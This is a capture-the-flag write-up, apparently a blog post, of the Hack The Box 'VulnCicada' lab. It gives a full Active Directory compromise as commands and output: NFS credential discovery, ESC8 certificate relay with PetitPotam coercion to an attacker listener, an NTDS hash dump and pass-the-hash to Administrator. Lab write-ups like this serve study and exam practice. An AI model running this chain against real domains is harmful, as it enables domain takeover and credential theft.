---
title: "HTB VulnCicada"
date: 2026-05-13 10:15 +0100
categories: [CPTS Preparation]
tags: [HTB, Machine, Windows, Medium, Vulnlab, ADCS]
image: /assets/img/posts/vulncicada/vulncicada.png
---

## Reconnaissance
### Scanning
- Nmap (All ports)
```
nmap -p- 10.129.234.48 -nv --min-rate 1000
```
```
PORT      STATE SERVICE                                                                                                                                      
53/tcp    open  domain                                                                                                                                       
80/tcp    open  http                                                                                                                                         
88/tcp    open  kerberos-sec                                                                                                                                 
111/tcp   open  rpcbind                                                                                                                                      
135/tcp   open  msrpc                                                                                                                                        
139/tcp   open  netbios-ssn                                                                                                                                  
389/tcp   open  ldap                                                                                                                                         
445/tcp   open  microsoft-ds                                                                                                                                 
464/tcp   open  kpasswd5                                                                                                                                     
593/tcp   open  http-rpc-epmap                                                                                                                               
636/tcp   open  ldapssl                                                                                                                                      
2049/tcp  open  nfs                                                                                                                                          
3268/tcp  open  globalcatLDAP                                                                                                                                
3269/tcp  open  globalcatLDAPssl                                                                                                                             
3389/tcp  open  ms-wbt-server                                                                                                                                
9389/tcp  open  adws                                                                                                                                         
49664/tcp open  unknown                                                                                                                                      
49667/tcp open  unknown                                                                                                                                      
54077/tcp open  unknown                                                                                                                                      
54079/tcp open  unknown                                                                                                                                      
54092/tcp open  unknown                                                                                                                                      
54157/tcp open  unknown                                                                                                                                      
54693/tcp open  unknown                                                                                                                                      
54985/tcp open  unknown
```
- NSE Scripts & Version
```
nmap -sCV -p53,80,88,111,135,139,389,445,464,593,636,2049,3268,3269,3389,9389,49664,49667,54077,54079,54092,54157,54693,54985 10.129.234.48 -nv --min-rate 1000
```
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-13 09:14:37Z)
111/tcp   open  rpcbind?
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Issuer: commonName=cicada-DC-JPQ225-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-13T08:40:33
| Not valid after:  2027-05-13T08:40:33
| MD5:     b48e c50b 121a 8ede 3344 813f 7e36 de54
| SHA-1:   6075 9b74 cb24 a1b0 ef0e 83b4 9984 8c93 1e4f 2eb1
|_SHA-256: 7f11 754e f255 5107 bf8b c2c7 0c2e 97c8 5158 c391 ec29 8835 22ef 70dc 4181 97d9
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time 
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl        
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl                      
| Issuer: commonName=cicada-DC-JPQ225-CA           
| Public Key type: rsa                                                                                                                                      
| Public Key bits: 2048                                                       
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-13T08:40:33
| Not valid after:  2027-05-13T08:40:33                                       
| MD5:     b48e c50b 121a 8ede 3344 813f 7e36 de54
| SHA-1:   6075 9b74 cb24 a1b0 ef0e 83b4 9984 8c93 1e4f 2eb1
|_SHA-256: 7f11 754e f255 5107 bf8b c2c7 0c2e 97c8 5158 c391 ec29 8835 22ef 70dc 4181 97d9
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl                                                                                                         
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Issuer: commonName=cicada-DC-JPQ225-CA
| Public Key type: rsa   
| Public Key bits: 2048                                                       
| Signature Algorithm: sha256WithRSAEncryption                                                                                                              
| Not valid before: 2026-05-13T08:40:33                                       
| Not valid after:  2027-05-13T08:40:33                                                                                                                     
| MD5:     b48e c50b 121a 8ede 3344 813f 7e36 de54
| SHA-1:   6075 9b74 cb24 a1b0 ef0e 83b4 9984 8c93 1e4f 2eb1
|_SHA-256: 7f11 754e f255 5107 bf8b c2c7 0c2e 97c8 5158 c391 ec29 8835 22ef 70dc 4181 97d9
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-05-13T09:16:27+00:00; -3h23m31s from scanner time.
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Issuer: commonName=DC-JPQ225.cicada.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-12T08:48:08
| Not valid after:  2026-11-11T08:48:08
| MD5:     f6fc 4a30 2b1d fb2d 1e89 08da d238 faa6
| SHA-1:   391f b9ce 6b8f 9bca 8164 9df3 e7c6 4393 3ce6 f3d8
|_SHA-256: a734 299c 6500 95a3 a772 6e64 cdbd c1cc 5b0a e233 3c29 9413 09bf d86a d4ef c556
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
54077/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
54079/tcp open  msrpc         Microsoft Windows RPC
54092/tcp open  msrpc         Microsoft Windows RPC
54157/tcp open  msrpc         Microsoft Windows RPC
54693/tcp open  msrpc         Microsoft Windows RPC
54985/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-13T09:15:46
|_  start_date: N/A
|_clock-skew: mean: -3h23m33s, deviation: 2s, median: -3h23m35s
```
### Configuration
- /etc/hosts
```
sudo nxc smb 10.129.234.48 --generate-hosts-file /etc/hosts
```
- /etc/krb5.conf
```
sudo nxc smb DC-JPQ225.cicada.vl --generate-krb5-file /etc/krb5.conf
```
- time
```
sudo ntpdate -u DC-JPQ225.cicada.vl
```
### NFS
```
➜  VulnCicada showmount -e 10.129.234.48                                                                     
Export list for 10.129.234.48:
/profiles (everyone)
```
![nfs_mnt](/assets/img/posts/vulncicada/nfs.png)
- Rosie.Powell
![nfs_mnt](/assets/img/posts/vulncicada/user1.png)
```
Rosie.Powell:Cicada123
```
- SMB
```
➜  VulnCicada nxc smb DC-JPQ225.cicada.vl -u 'Rosie.Powell' -p 'Cicada123' -k
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123
```
- SHARE
```
➜  VulnCicada nxc smb DC-JPQ225.cicada.vl -u 'Rosie.Powell' -p 'Cicada123' -k --shares
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] Enumerated shares
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Share           Permissions     Remark
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        -----           -----------     ------
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        ADMIN$                          Remote Admin
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        C$                              Default share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        CertEnroll      READ            Active Directory Certificate Services share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        IPC$            READ            Remote IPC
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        NETLOGON        READ            Logon server share 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        profiles$       READ,WRITE      
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        SYSVOL          READ            Logon server share
```
## ADCS
### Enum
- CCACHE
```
nxc smb DC-JPQ225.cicada.vl -u 'Rosie.Powell' -p 'Cicada123' -k --generate-tgt Rosie
export KRB5CCNAME=Rosie.ccache
```
- Find `Vuln`
```
certipy-ad find -target DC-JPQ225.cicada.vl -u 'Rosie.Powell' -p 'Cicada123' -k -vulnerable -stdout
```
```
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
    Certificate Serial Number           : 2A94800EAF4947864CC290DF4AC1E256
    Certificate Validity Start          : 2026-05-13 08:44:10+00:00
    Certificate Validity End            : 2526-05-13 08:54:10+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCa                        : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        ManageCertificates              : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates
```
### ESC8
- DNS record
```
bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.14.141
```
- certipy `relay` targeting the ADCS webserver
```
certipy-ad relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController
```
- different methods for `coercing` authentication
```
nxc smb DC-JPQ225.cicada.vl -u 'Rosie.Powell' -p 'Cicada123' -k -M coerce_plus                       
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, DFSCoerce
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, MSEven
```
- METHOD="PetitPotam"
```
nxc smb DC-JPQ225.cicada.vl -u 'Rosie.Powell' -p 'Cicada123' -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam              
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, efsrpc\EfsRpcAddUsersToFile
```
- TARGET
```
impacket-ntlmrelayx -t 'http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp' --adcs --template DomainController -smb2support
```
```
[*] Servers started, waiting for connections
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up WinRM (HTTP) Server on port 5985
[*] (SMB): Received connection from 10.129.234.48, attacking target http://dc-jpq225.cicada.vl
[*] HTTP server returned error code 200, treating as a successful login
[*] (SMB): Authenticating connection from /@10.129.234.48 against http://dc-jpq225.cicada.vl SUCCEED [1]
[*] http:///@dc-jpq225.cicada.vl [1] -> Generating CSR...
[*] http:///@dc-jpq225.cicada.vl [1] -> CSR generated!
[*] http:///@dc-jpq225.cicada.vl [1] -> Getting certificate...
[*] (SMB): Received connection from 10.129.234.48, attacking target http://dc-jpq225.cicada.vl
[*] HTTP server returned error code 200, treating as a successful login
[*] (SMB): Authenticating connection from /@10.129.234.48 against http://dc-jpq225.cicada.vl SUCCEED [2]
[*] http:///@dc-jpq225.cicada.vl [2] -> Skipping user  since attack was already performed
[*] http:///@dc-jpq225.cicada.vl [1] -> GOT CERTIFICATE! ID 88
[*] http:///@dc-jpq225.cicada.vl [1] -> Writing PKCS#12 certificate to ./DC-JPQ225.cicada.vl.pfx
[*] http:///@dc-jpq225.cicada.vl [1] -> Certificate successfully written to file
```
```
certipy-ad auth -pfx DC-JPQ225.cicada.vl.pfx -dc-ip 10.129.234.48
```
- NTDS dump
```
nxc smb DC-JPQ225.cicada.vl -u 'dc-jpq225$' -H 'a65952c664e9cf5de60195626edbeee3' -k --ntds
```
### Administrator
```
➜  VulnCicada nxc smb DC-JPQ225.cicada.vl -u 'Administrator' -H '85a0da53871a9d56b6cd05deda3a5e87' -k
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Administrator:85a0da53871a9d56b6cd05deda3a5e87 (Pwn3d!)
```
```
impacket-wmiexec cicada.vl/administrator@dc-jpq225.cicada.vl -k -hashes :85a0da53871a9d56b6cd05deda3a5e87
```
